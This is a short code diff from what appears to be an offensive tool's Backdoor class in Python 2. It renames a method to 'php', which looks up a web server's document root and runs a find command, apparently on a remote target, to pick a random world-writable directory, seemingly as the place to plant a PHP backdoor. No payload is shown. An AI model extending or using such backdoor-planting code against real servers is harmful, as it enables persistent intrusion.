@@ -104,7 +104,7 @@ class Backdoor(object):
             print '\n{0}[!] Didn\'t find perl on the remote system{1}'.format(Colors.RED, Colors.END)
 
 
-    def (self, ip, ourIP):
+    def php(self, ip, ourIP):
         wwwroot = linux.get_doc_root()
         cmd = 'find {0} -depth -perm -0002 -type d | sort -R | head -n 1'.format(wwwroot)       # Ths could be put into a function? this/spread/get_writble_dir
         folder = make_request.get_page_source(cmd)
